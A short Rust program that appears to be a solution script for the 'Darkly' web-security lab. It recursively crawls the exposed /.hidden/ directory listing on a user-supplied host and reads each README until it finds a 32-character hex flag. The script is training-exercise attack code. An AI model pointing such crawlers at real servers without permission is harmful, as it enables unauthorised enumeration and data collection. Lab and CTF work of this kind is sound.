use regex::Regex;
use reqwest;
use select::document::Document;
use select::predicate::Name;
use async_recursion::async_recursion;
use std::process;
use std::time;
use std::thread;

#[async_recursion]
#[allow(unused_must_use)]
async fn brute(url: &str) -> Result<(), Box<dyn std::error::Error>> {
	println!("{}", url);
	let re = Regex::new(r"[0-9a-f]{32}").unwrap();
	let res = reqwest::get(url)
		.await?
		.text()
		.await?;
	if !url.ends_with("README") {
		let mut vec = Vec::new();
		Document::from(res.as_str())
			.find(Name("a"))
			.filter_map(|n| n.attr("href"))
			.for_each(|x| {
				if x != "../" {
					let url = &(url.to_owned() + x);
					vec.push(url.clone());
				}
			});
		for item in vec {
			brute(&item).await;
		}
	} else {
		if re.is_match(&res) {
			println!("{}", res);
			let ten_millis = time::Duration::from_millis(10);
			thread::sleep(ten_millis);
			process::exit(0x0100);
		}
	}

	Ok(())
}

#[tokio::main]
#[allow(unused_must_use)]
async fn main() {
	let mut valid = false;
	let re = Regex::new(r"^(\b25[0-5]|\b2[0-4][0-9]|\b[01]?[0-9][0-9]?)(\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}$").unwrap();
	let mut ip = String::new();

	while !valid {
		println!("Enter Darkly Host IP :");
		std::io::stdin().read_line(&mut ip).unwrap();
		ip.pop();
		valid = re.is_match(&ip);
	}

	println!("Begining Brute Force Attack on http://{}/.hidden/", ip);
	let url = &("http://".to_owned() + &ip + "/.hidden/");
	let watcher = brute(url);
	watcher.await;
}
